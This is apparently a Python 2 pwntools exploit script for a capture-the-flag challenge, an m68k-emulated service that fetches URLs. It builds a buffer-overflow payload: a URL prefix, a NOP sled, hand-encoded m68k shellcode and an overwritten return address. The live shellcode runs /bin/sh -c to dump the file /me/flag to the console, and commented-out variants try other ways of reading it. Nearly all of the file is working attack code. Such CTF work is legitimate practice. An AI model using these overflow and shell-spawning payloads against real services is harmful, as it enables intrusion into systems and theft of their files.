#!/usr/bin/env python2

# Just a super simple frontend for me to test the service (manually)
from pwn import *
context.log_level = 'debug'
context.arch = 'm68k'

import sys
import re
import os
import PIL.Image
import base64
import StringIO

def gen_exploit():
    # Prefix is "GET /aaa"
    prefix_size = 8

    # Flag is in /me/flag

    payload = "http://example.com/aaa"

    #shellcode = "\xde\xfc\x03\xe8\x70\x02\x4e\x44\x4a\x80\x66\x3a\xb7\x83\x2f\x03\x2f\x3c\x6f\x70\x65\x6e\x2f\x3c\x62\x69\x6e\x2f\x2f\x3c\x75\x73\x72\x2f\x2f\x3c\x2f\x2f\x2f\x2f\x22\x0f\x2f\x03\x2f\x3c\x66\x6c\x61\x67\x2f\x3c\x2f\x6d\x65\x2f\x28\x0f\x2f\x03\x2f\x04\x2f\x01\x24\x0f\x70\x3b\x4e\x44\x60\xfe"

    # this shellcode calls "open /me/flag", however it doesn't work because the popup is behind the file viewer!
    #shellcode = "\xde\xfc\x03\xe8\xb7\x83\x2f\x03\x2f\x3c\x6f\x70\x65\x6e\x2f\x3c\x62\x69\x6e\x2f\x2f\x3c\x75\x73\x72\x2f\x2f\x3c\x2f\x2f\x2f\x2f\x22\x0f\x2f\x03\x2f\x3c\x66\x6c\x61\x67\x2f\x3c\x2f\x6d\x65\x2f\x28\x0f\x2f\x03\x2f\x04\x2f\x01\x24\x0f\x70\x3b\x4e\x44\x4e\x71\x4e\x71\x60\xfe"

    # this shellcode calls /bin/sh -c "wall < /me/flag", and this should show up in the console!
    shellcode = "\xde\xfc\x03\xe8\xb7\x83\x2f\x03\x2f\x3c\x6e\x2f\x73\x68\x2f\x3c\x2f\x2f\x62\x69\x22\x0f\x2f\x03\x3f\x3c\x2d\x63\x2a\x0f\x2f\x03"
    shellcode += "\x2f\x3c\x66\x6c\x61\x67\x2f\x3c\x2f\x6d\x65\x2f\x2f\x3c\x61\x6c\x6c\x3c\x2f\x3c\x67\x20\x3b\x77\x2f\x3c\x2f\x66\x6c\x61\x2f\x3c\x3c\x2f\x6d\x65\x2f\x3c\x77\x61\x6c\x6c"
    shellcode += "\x28\x0f\x2f\x03\x2f\x04\x2f\x05\x2f\x01\x24\x0f\x70\x3b\x4e\x44"
    
    nopsled = '\x4e\x71' * ((258 - prefix_size - len(shellcode))/2)    

    payload = payload + nopsled + shellcode

    payload += 'bcde'

    addr = p32(0x3fff6f6 +8 + 96)

    payload += addr

    return payload
    

def main():
    if len(sys.argv) != 3:
        print "usage: exploit.py <ip> <port>"
        sys.exit(-1)
    
    ip = sys.argv[1]
    port = sys.argv[2]

    conn = remote(ip, port)

    print conn.recvuntil("What URL would you like this old dog to fetch?")

    payload = gen_exploit()

    conn.sendline(payload)

    print conn.recvuntil("Booting up")

    img = None
    try:
        while True:
            response = conn.recvline()

            if response.startswith("DEBUG"):
                img_b64 = response[6:]
                img = base64.b64decode(img_b64)
                io = StringIO.StringIO()
                io.write(img)
                io.seek(0)

                i = PIL.Image.open(io)
                i.show()

            else:
                print response
    except EOFError:
        # try to extract the flag from the last image
        print "In the last frame, extract that flag!"
        


if __name__ == '__main__':
    main()

